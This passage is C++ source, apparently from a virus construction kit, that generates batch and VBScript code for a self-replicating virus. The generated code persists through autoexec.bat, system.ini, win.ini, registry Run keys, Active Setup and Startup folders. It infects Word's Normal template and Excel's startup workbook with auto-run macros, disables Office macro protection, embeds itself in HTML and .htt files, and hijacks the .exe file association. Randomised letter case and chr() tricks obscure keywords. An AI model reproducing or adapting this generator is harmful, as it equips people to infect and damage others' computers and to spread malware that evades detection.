        wstf("copy "+istd+"\\" + tmpn + ".bat "+istd+"\\" + dosd + "\\" + autn + ".bat" + ffos);
        wstf("attrib -r \\autoexec.bat" + ffos);
        wstf(CaseRand("echo")+" @call "+istd+"\\" + dosd + "\\" + autn + ".bat "+dosr+">>\\autoexec.bat" + ffos);
        wstf(":" + autl);
    }
    if (Form15->CheckBox6->Checked == true)
    {
        wstf("if exist "+istd+"\\" + dosd + "\\" + wstn + ".bat goto " + wstl);
        wstf("copy "+istd+"\\" + tmpn + ".bat "+istd+"\\" + dosd + "\\" + wstn + ".bat" + ffos);
        wstf("attrib -r %"+CaseRand("windir")+"%\\winstart.bat" + ffos);
        wstf(CaseRand("echo")+" @call "+istd+"\\" + dosd + "\\" + wstn + ".bat "+dosr+">>%"+CaseRand("windir")+"%\\winstart.bat" + ffos);
        wstf(":" + wstl);
    }
    if (Form15->CheckBox5->Checked == true)
    {
        wstf("copy %"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+" "+istd+"\\" + sisn + ".vbs" + ffos);
        wstf("find /v /i \"[boot]\"<%"+CaseRand("windir")+"%\\system.ini>%"+CaseRand("tmp")+"%\\" + sis1 + "."+tfre+"" + ffos);
        wstf("find /v /i \"shell=explorer.exe\"<%"+CaseRand("tmp")+"%\\" + sis1 + "."+tfre+">%"+CaseRand("tmp")+"%\\" + sis2 + "."+tfre+"" + ffos);
        wstf("del %"+CaseRand("windir")+"%\\system.ini" + ffos);
        wstf(CaseRand("echo")+" [boot]>%"+CaseRand("windir")+"%\\system.ini" + ffos);
        wstf(CaseRand("echo")+" Shell=Explorer.exe " + sisn + ".vbs>>%"+CaseRand("windir")+"%\\system.ini" + ffos);
        wstf("type %"+CaseRand("tmp")+"%\\" + sis2 + "."+tfre+">>%"+CaseRand("windir")+"%\\system.ini" + ffos);
    }
    if (Form15->CheckBox4->Checked == true)
    {
        int tmrn;
        wstf("copy %"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+" "+istd+"\\" + wisn + ".vbs" + ffos);
        wstf("find /v /i \"[windows]\"<%"+CaseRand("windir")+"%\\win.ini>%"+CaseRand("tmp")+"%\\" + wis1 + "."+tfre+"" + ffos);
        wstf("find /v /i \"load=\"<%"+CaseRand("tmp")+"%\\" + wis1 + "."+tfre+">%"+CaseRand("tmp")+"%\\" + wis2 + "."+tfre+"" + ffos);
        wstf("find /v /i \"run=\"<%"+CaseRand("tmp")+"%\\" + wis2 + "."+tfre+">%"+CaseRand("tmp")+"%\\" + wis3 + "."+tfre+"" + ffos);
        wstf("find /v /i \"NullPort=\"<%"+CaseRand("tmp")+"%\\" + wis2 + "."+tfre+">%"+CaseRand("tmp")+"%\\" + wis3 + "."+tfre+"" + ffos);
        wstf("del %"+CaseRand("windir")+"%\\win.ini" + ffos);
        wstf(CaseRand("echo")+" [windows]>%"+CaseRand("windir")+"%\\win.ini" + ffos);
        Randomize();
        tmrn = random(5000);
        if (tmrn % 2 == 1)
        {
            wstf(CaseRand("echo")+" load=" + wisn + ".vbs>>%"+CaseRand("windir")+"%\\win.ini" + ffos);
            wstf(CaseRand("echo")+" run=>>%"+CaseRand("windir")+"%\\win.ini" + ffos);
        }
        else
        {
            wstf(CaseRand("echo")+" load=>>%"+CaseRand("windir")+"%\\win.ini" + ffos);
            wstf(CaseRand("echo")+" run=" + wisn + ".vbs>>%"+CaseRand("windir")+"%\\win.ini" + ffos);
        }
        wstf(CaseRand("echo")+" NullPort=None>>%"+CaseRand("windir")+"%\\win.ini" + ffos);
        wstf("type %"+CaseRand("tmp")+"%\\" + wis3 + "."+tfre+">>%"+CaseRand("windir")+"%\\win.ini" + ffos);
    }
    wstf(CaseRand("echo")+".on error resume next>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    if (Form15->RadioButton13->Checked == true || Form15->RadioButton14->Checked == true || Form15->RadioButton12->Checked == true)
        wstf(CaseRand("echo")+" dim "+wshl+","+fvai+"," + fvw2 + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" "+CaseRand("set")+" " + sfso + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"%" + vbih + "%ing.filesystemobject\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" "+CaseRand("set")+" " + wshl + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"w%" + vbih + "%.shell\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    // vbs writing
    wstf(CaseRand("echo")+" "+CaseRand("set")+" " + fvw1 + "=" + sfso + ".opentextfile(\""+istd+"\\" + tmpn + ".bat\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" " + fvw2 + "=" + fvw1 + ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" " + fvw1 + ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" "+CaseRand("set")+" " + fvw1 + "=" + sfso + ".opentextfile(\""+istd+"\\" + istv + ".vbs\",8)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" " + fvw1 + ".write \"" + vbik + ".write \"\"\"\"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" for "+fvw6+"=1 to len("+fvw2+")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" "+fvw5+"=asc(mid("+fvw2+","+fvw6+",1))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" " + fvw1 + ".write \"&chr(\"&"+fvw5+"&\")\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" " + fvw1 + ".writeline vbcrlf&\"" + vbik + ".close\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" " + fvw1 + ".writeline \"" + tmps + ".run \"&chr(34)&\"%"+CaseRand("tmp")+"%\\" + vbib + ".bat\"&chr(34)&\",0\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" " + fvw1 + ".write \"end if\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" " + fvw1 + ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    if (Form15->RadioButton4->Checked)// registry spawning (write the virus code to registry)
        wstf(CaseRand("echo")+" " + wshl + ".regwrite \"HKCU\\Software\\" + plrn + "\\\"," + fvw2 + ">>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
    if (Form15->CheckBox86->Checked || (Form15->CheckBox76->Checked&&(Form15->ComboBox17->Text == ".htm" || Form15->ComboBox17->Text == ".html")) || (Form15->CheckBox78->Checked&&(Form15->ComboBox18->Text == ".htm" || Form15->ComboBox18->Text == ".html")) || (Form15->CheckBox77->Checked&&(Form15->ComboBox19->Text == ".htm" || Form15->ComboBox19->Text == ".html")) || (Form15->CheckBox50->Checked&&(Form15->ComboBox16->Text == ".htm" || Form15->ComboBox16->Text == ".html")) || Form15->CheckBox36->Checked == true || Form15->CheckBox51->Checked == true || Form15->CheckBox52->Checked == true || Form15->CheckBox58->Checked == true)
    {  // html temp writing
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + htmv + "=" + sfso + ".createtextfile(\"%"+CaseRand("tmp")+"%\\" + htmt + "."+tfre+"\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + htmv + ".writeline chr(60)&\"script language=vbscript id="+CaseRand("wscript")+"\"&chr(62)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + htmv + ".write " + fvw2 + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + htmv + ".writeline chr(60)&\"/script\"&chr(62)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + htmv + ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox96->Checked)
    { // word macro module writing
        AnsiString wmrt;
        if (Form15->ComboBox24->ItemIndex == 0) wmrt = "Open";
        else wmrt = "Close";
        wstf(CaseRand("echo")+" Sub Auto"+wmrt+"()>%"+CaseRand("tmp")+"%\\" + wmtm + "."+tfre+ ffos);
        wstf(CaseRand("echo")+".On Error Resume Next>>%"+CaseRand("tmp")+"%\\" + wmtm + "."+tfre + ffos);
        wstf(CaseRand("echo")+" Dim " + wmvc+">>%"+CaseRand("tmp")+"%\\" + wmtm + "."+tfre + ffos);
        if (Form15->CheckBox99->Checked) // macro menu hiding
            wstf(CaseRand("echo")+" CommandBars(\"Macro\").Visible=0>>%"+CaseRand("tmp")+"%\\" + wmtm + "."+tfre + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + wmmf + "=" + sfso + ".opentextfile(\"%"+CaseRand("tmp")+"%\\" + wmtm + "."+tfre+"\",8)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" dim "+wmv1+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+wmv1+"=90>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" for "+wmcv+"=1 to len("+fvw2+")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+wmtc+"=asc(mid("+fvw2+","+wmcv+",1))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if "+wmv1+"=90 then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wmmf + ".write vbcrlf&\""+wmvc+" = "+wmvc+" & Chr(\"&"+wmtc+"&\")\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+wmv1+"=1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" else>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wmmf + ".write \" & Chr(\"&"+wmtc+"&\")\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+wmv1+"="+wmv1+"+1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wmmf + ".writeline \"Open \"\"%"+CaseRand("tmp")+"%\\" + wmbf + ".bat\"\" For Output As #1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wmmf + ".writeline \"Print #1, "+wmvc+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wmmf + ".writeline \"Close #1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wmmf + ".writeline \"VBA.Shell \"\"%"+CaseRand("tmp")+"%\\" + wmbf + ".bat\"\", 0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wmmf + ".writeline \"End Sub\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wmmf + ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        // word templates infection
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + wmwa + "="+CaseRand("createobject(\"word.application\")")+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" "+wmnt+"=" + wmwa + "."+CaseRand("normaltemplate.vbproject.vbcomponents")+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+wmnt+".import \"%"+CaseRand("tmp")+"%\\" + wmtm + "."+tfre+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wmwa + ".normaltemplate.save>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox98->Checked) // remove protection
        {
            wstf(CaseRand("echo")+" " + wshl + ".regwrite \"HKCU\\Software\\Microsoft\\Office\\\"&" + emea + ".version&\"\\Word\\Security\\Level\",1,\"REG_DWORD\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wshl + ".regwrite \"HKCU\\Software\\Microsoft\\Office\\\"&" + emea + ".version&\"\\Word\\Security\\AccessVBOM\",1,\"REG_DWORD\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmwa + ".displayalerts=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmwa + ".screenupdating=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmwa + ".enablecancelkey=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmwa + ".displaystatusbar=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmwa + ".options.confirmconversions=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmwa + ".options.virusprotection=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmwa + ".options.savenormalprompt=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmwa + ".showvisualbasiceditor=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        wstf(CaseRand("echo")+" " + wmwa + ".quit>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        // create infected document
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + wmwa + "="+CaseRand("createobject(\"word.document\")")+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wmwa + ".saveas \"%"+CaseRand("tmp")+"%\\" + wmid + "."+tfre+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wmwa + ".application.quit>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox97->Checked)
    { // excel macro module writing      
        AnsiString emrt;
        if (Form15->ComboBox25->ItemIndex == 0) emrt = "Open";
        else emrt = "Close";
        wstf(CaseRand("echo")+" Sub Auto_"+emrt+"()>%"+CaseRand("tmp")+"%\\" + emtm + "."+tfre + ffos);
        if (Form15->CheckBox96->Checked)
            wstf("find /v \"Auto"+emrt+"\"<%"+CaseRand("tmp")+"%\\" + wmtm + "."+tfre+">>%"+CaseRand("tmp")+"%\\" + emtm + "."+tfre + ffos);
        else
        {                  
            wstf(CaseRand("echo")+".On Error Resume Next>>%"+CaseRand("tmp")+"%\\" + emtm + "."+tfre + ffos);
            wstf(CaseRand("echo")+" Dim " + wmvc+">>%"+CaseRand("tmp")+"%\\" + wmtm + "."+tfre + ffos);
            if (Form15->CheckBox99->Checked) // macro menu hiding
                wstf(CaseRand("echo")+" CommandBars(\"Macro\").Visible=0>>%"+CaseRand("tmp")+"%\\" + wmtm + "."+tfre + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + wmmf + "=" + sfso + ".opentextfile(\"%"+CaseRand("tmp")+"%\\" + emtm + "."+tfre+"\",8)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" dim "+emv1+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+emv1+"=90>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" for "+emcv+"=1 to len("+fvw2+")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+emtc+"=asc(mid("+fvw2+","+emcv+",1))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" if "+emv1+"=90 then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmmf + ".write vbcrlf&\""+wmvc+" = "+wmvc+" & Chr(\"&"+wmtc+"&\")\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+emv1+"=1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" else>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmmf + ".write \" & Chr(\"&"+wmtc+"&\")\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+emv1+"="+emv1+"+1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmmf + ".writeline \"Open \"\"%"+CaseRand("tmp")+"%\\" + wmbf + ".bat\"\" For Output As #1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmmf + ".writeline \"Print #1, "+wmvc+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmmf + ".writeline \"Close #1\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmmf + ".writeline \"VBA.Shell \"\"%"+CaseRand("tmp")+"%\\" + wmbf + ".bat\"\", 0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmmf + ".writeline \"End Sub\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wmmf + ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }   
        // excel template infection
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + emea + "="+CaseRand("createobject(\"excel.application\")")+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" "+emes+"="+CaseRand("createobject(\"excel.sheet\")")+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+emes+"."+CaseRand("application.workbooks(1).vbproject.vbcomponents.import")+" \"%"+CaseRand("tmp")+"%\\" + emtm + "."+tfre+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+emes+".application.workbooks(1).saveas " + emea + ".startuppath&\"\\"+emis+".xls\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox98->Checked) // remove protection
        {
            wstf(CaseRand("echo")+" " + wshl + ".regwrite \"HKCU\\Software\\Microsoft\\Office\\\"&" + emea + ".version&\"\\Excel\\Security\\Level\",1,\"REG_DWORD\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wshl + ".regwrite \"HKCU\\Software\\Microsoft\\Office\\\"&" + emea + ".version&\"\\Excel\\Security\\AccessVBOM\",1,\"REG_DWORD\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emea + ".displayalerts=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emea + ".screenupdating=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emea + ".enablecancelkey=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emea + ".displaystatusbar=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        // create infected sheet
        wstf(CaseRand("echo")+" " + sfso + ".copyfile "+ emea + ".startuppath&\"\\"+emis+".xls\",\"%"+CaseRand("tmp")+"%\\" + emis + "."+tfre+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox57->Checked)
    { // xxx.htt writing
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + dihf + "=" + sfso + ".createtextfile(\"%"+CaseRand("tmp")+"%\\" + dihn + "."+tfre+"\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + dihf + ".writeline chr(60)&\"script language=vbscript id="+CaseRand("wscript")+"\"&chr(62)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + dihf + ".write " + fvw2 + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + dihf + ".writeline chr(60)&\"/script\"&chr(62)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + dihf + ".writeline chr(60)&\"object border=0 id=" + dihx + " tabindex=1 classid=\"\"clsid:1820FED0-473E-11D0-A96C-00C04FD705A2\"\"\"&chr(62)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + dihf + ".writeline chr(60)&\"/object\"&chr(62)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + dihf + ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox34->Checked)
    {
        wstf("copy %"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+" "+istd+"\\" + rg1v + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKLM\\"+CaseRand("Software\\Microsoft\\Windows\\Curren\"&chr(115+1)&\"Version")+"\\" + Form15->ComboBox5->Text + "\\" + rg1k + "\",\""+CaseRand("wscript")+" "+istd+"\\" + rg1v + ".vbs\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox35->Checked)
    {
        wstf("copy %"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+" "+istd+"\\" + rg2v + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCU\\"+CaseRand("Software\\Microsoft\\Windows\\Curren\"&chr(115+1)&\"Version")+"\\" + Form15->ComboBox6->Text + "\\" + rg2k + "\",\""+istd+"\\" + rg2v + ".vbs\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox7->Checked)
    {
        wstf("copy %"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+" "+istd+"\\" + actv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKLM\\"+CaseRand("Software\\Microsoft\\Active setup\\Installed Components\\KeyName\\StubPath")+"\",\""+istd+"\\" + actv + ".vbs\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox2->Checked)
    {
        Randomize();
        if (random(40000)<=20000)
        {
            kk2 = false;
            wstf(CaseRand("echo")+" " + sfr2 + "=" + wshl + "."+CaseRand("specialfolders")+"(\""+CaseRand("allusersstartup")+"\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + sfso + "."+CaseRand("copyfile")+" \"%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"\"," + sfr2 + " & \"\\" + sfr4 + ".vbs\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        else
        {
            kk2 = true;
            wstf(CaseRand("echo")+" " + sfr1 + "=" + wshl + "."+CaseRand("specialfolders")+"(\""+CaseRand("startup")+"\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + sfso + "."+CaseRand("copyfile")+" \"%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"\"," + sfr1 + " & \"\\" + sfr3 + ".vbs\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
    }
    if (Form15->CheckBox15->Checked == true || Form15->CheckBox16->Checked == true || Form15->CheckBox17->Checked == true || Form15->CheckBox18->Checked == true || Form15->CheckBox1->Checked == true || Form15->CheckBox40->Checked == true)
    {
        wstf("find /i /v \"run\"<%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+">"+istd+"\\" + rssv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" dim " + rssk + ", " + rssm + ">>"+istd+"\\" + rssv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + rssa + "="+CaseRand("wscript")+".Arguments>>"+istd+"\\" + rssv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if not(" + rssa + ".count=0) and not(" + rssa + ".count=1) then>>"+istd+"\\" + rssv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" for " + rssk + "=0 to " + rssa + ".count-1>>"+istd+"\\" + rssv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + rssm + "=" + rssm + "&" + rssa + "(" + rssk + ")&\" \">>"+istd+"\\" + rssv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" next>>"+istd+"\\" + rssv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + tmps + ".exec " + rssm + ">>"+istd+"\\" + rssv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>"+istd+"\\" + rssv + ".vbs" + ffos);
        if (Form15->CheckBox92->Checked) wstf(CaseRand("echo")+" if " + tmps + ".regread(\"HKCU\\Software\\" + plrn + "\\" + exck + "\")=\"\" then'run>>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
        if (Form15->RadioButton4->Checked)
        { // registry spawning (read the code from the registry)
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + rry1 + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"%" + vbih + "%ing.filesystemobject\")>>"+istd+"\\" + rssv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" dim " + rry2 + ">>"+istd+"\\" + rssv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+ rry2 + "=" + tmps + ".regread(\"HKCU\\Software\\" + plrn + "\\\")>>"+istd+"\\" + rssv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + rry3 + "=" + rry1 + ".createtextfile(\""+istd+"\\" + tmpn + ".bat\",1)>>"+istd+"\\" + rssv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + rry3 + ".write "+ rry2 + ">>"+istd+"\\" + rssv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + rry3 + ".close>>"+istd+"\\" + rssv + ".vbs" + ffos);
        }
        wstf(CaseRand("echo")+" " + tmps + ".run \""+istd+"\\" + tmpn + ".bat "+vtmr+"\",0>>"+istd+"\\" + rssv + ".vbs" + ffos);
        if (Form15->CheckBox92->Checked) wstf(CaseRand("echo")+" " + tmps + ".regwrite \"HKCU\\Software\\" + plrn + "\\" + exck + "\",\"" + excv + "\">>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
        if (Form15->CheckBox92->Checked) wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
        wstf(ffos + rvtfk + CaseRand("set")+" " + rsss + "="+CaseRand("file\\shell\\open\\comman"));
    }
    if (Form15->CheckBox15->Checked)
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCR\\exe%" + rsss + "%d\\\",\""+CaseRand("wscript")+" "+istd+"\\" + rssv + ".vbs \"\"%%1 %%*\"\"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    if (Form15->CheckBox16->Checked)
